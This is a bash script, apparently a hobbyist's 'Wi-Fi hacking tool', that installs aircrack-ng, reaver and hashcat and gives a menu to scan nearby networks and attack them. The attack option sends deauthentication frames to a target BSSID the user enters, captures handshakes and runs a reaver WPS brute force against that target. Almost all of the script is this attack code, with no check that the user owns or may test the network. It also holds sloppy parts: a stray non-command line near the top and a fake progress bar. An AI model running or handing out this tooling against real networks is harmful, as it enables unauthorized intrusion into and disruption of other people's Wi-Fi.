#!/bin/bash
installation of tool 

# Define some color codes for terminal output
RESET='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'

# Function to show a colorful progress bar
show_progress() {
    local -r duration=$1
    local -r total=$2
    local -r width=50
    local -r step=$((duration / total))
    local i=0
    local percent=0

    # Loop to simulate progress
    while [ $i -le $total ]; do
        percent=$((i * 100 / total))
        printf "\r${CYAN}Installing Tool [%-${width}s] %d%%${RESET}" "$(printf "%0.s#" $(seq 1 $((i * width / total))))" "$percent"
        sleep $step
        ((i++))
    done
    echo -e "\n${GREEN}Installation Complete!${RESET}"
}

# Function to simulate the installation process
install_tool() {
    echo -e "${BLUE}Starting installation of Tool...${RESET}"
    sleep 1
    show_progress 5 100  # Show progress bar, duration = 5 seconds, total steps = 100
    echo -e "${GREEN}Tool installation finished!${RESET}"
}

# Start the installation process
echo -e "${YELLOW}Preparing to install the tool...${RESET}"

# Step 1: Update package lists
echo -e "${CYAN}Updating package lists with apt update...${RESET}"
sudo apt update -y
echo -e "${GREEN}Package lists updated successfully!${RESET}"

# Step 2: Install the tool (Aircrack-ng in this example)
install_tool

echo -e "${CYAN}Proceeding with actual tool installation...${RESET}"
# Uncomment the following line to actually install a package (e.g., Aircrack-ng)
sudo apt install -y aircrack-ng

echo -e "${GREEN}Installation successful! Tool is ready to use.${RESET}"

# clearing the logical screen

clear
# Define color variables
red='\033[31m'
cyan='\033[36m'
yellow='\033[33m'
blue='\033[34m'
green='\033[32m'
reset='\033[0m'  # Reset color to default

# Version
version="1.0"

# Author
author="ARYAN JOSHI"

# Function to print the ASCII Art and additional information
print_ascii_art() {
  echo -e "${red}    _____                                  _________        ___."
  echo -e "${cyan}  /  _  \  _____ ___.__._____    ____     \_   ___ \___.__.\_ |__"
  echo -e "${yellow} /  /_\\  \_  __ <   |  |\\__  \  /    \    /    \  \<   |  | | __"
  echo -e "${blue}/    |    \  | \/\___  | / __ \|   |  \   \     \___\___  | | \\_\\"
  echo -e "${red}\\  ____|__  /__|   / ____|(____  /___|  /____\\______  / ____| |___  /"
  echo -e "         \/       \/          \/     \/_____/      \/\/          \/"
  echo -e "${yellow}                           [${blue}v${version}${yellow}]"
  echo -e "${cyan}                           [${blue}By ${green}${author}${cyan}]${reset}"
}

# Function to display the loading screen
loading_screen() {
  echo -e "${yellow}Loading...${reset}"
  for i in {1..10}; do
    echo -ne "${yellow}#${reset}"
    sleep 0.2
  done
  echo -e "${green} Done${reset}"
}

# Function to install required tools
install_tools() {
  echo -e "${blue}Installing required tools...${reset}"
  sudo apt-get update
  sudo apt-get install -y aircrack-ng reaver hashcat
  echo -e "${green}Tools installed successfully.${reset}"
}

# Function to create Wi-Fi hacking directory and tool
create_hacking_tool() {
  echo -e "${blue}Creating Wi-Fi hacking directory and tool...${reset}"
  mkdir ~/WiFiHackingTools
  cd ~/WiFiHackingTools

  cat > wifitool.sh << EOF
#!/bin/bash

echo "Wi-Fi Hacking Tool"
echo "=================="
echo "1. Scan for Wi-Fi networks"
echo "2. Crack Wi-Fi password"
echo "3. Quit"

read -p "Enter your choice (1-3): " choice

case \$choice in
  1)
    echo "Scanning for Wi-Fi networks..."
    sudo airodump-ng wlan0
    ;;
  2)
    echo "Cracking Wi-Fi password..."
    read -p "Enter the BSSID of the target network: " bssid
    read -p "Enter the channel of the target network: " channel
    sudo aireplay-ng --deauth 6 -a \$bssid wlan0
    sudo airodump-ng --bssid \$bssid -c \$channel -w capture wlan0
    sudo reaver -i wlan0 -b \$bssid -c \$channel -vvv
    ;;
  3)
    echo "Exiting..."
    exit 0
    ;;
  *)
    echo "Invalid choice. Exiting..."
    exit 1
    ;;
esac
EOF

  chmod +x wifitool.sh
  echo -e "${green}Wi-Fi hacking tool created successfully.${reset}"
}

# Function to scan for Wi-Fi networks
scan_networks() {
  echo -e "${blue}Scanning for Wi-Fi networks...${reset}"
  sudo airodump-ng wlan0
}

# Function to crack Wi-Fi password
crack_password() {
  echo -e "${blue}Cracking Wi-Fi password...${reset}"
  read -p "Enter the BSSID of the target network: " bssid
  read -p "Enter the channel of the target network: " channel
  sudo aireplay-ng --deauth 6 -a $bssid wlan0
  sudo airodump-ng --bssid $bssid -c $channel -w capture wlan0
  sudo reaver -i wlan0 -b $bssid -c $channel -vvv
}

# Function to quit the script
quit_script() {
  echo -e "${yellow}Exiting...${reset}"
  exit 0
}

# Function to display the main menu
main_menu() {
  echo -e "${yellow}Menu"
  echo -e "====${reset}"
  echo -e "1. Install Tools"
  echo -e "2. Create Wi-Fi Hacking Tool"
  echo -e "3. Scan for Wi-Fi Networks"
  echo -e "4. Crack Wi-Fi Password"
  echo -e "5. Quit"

  read -p "Enter your choice (1-5): " choice

  case $choice in
    1)
      install_tools
      ;;
    2)
      create_hacking_tool
      ;;
    3)
      scan_networks
      ;;
    4)
      crack_password
      ;;
    5)
      quit_script
      ;;
    *)
      echo -e "${red}Invalid choice. Exiting...${reset}"
      exit 1
      ;;
  esac
}

# Main script execution
print_ascii_art
loading_screen
main_menu

# End of script
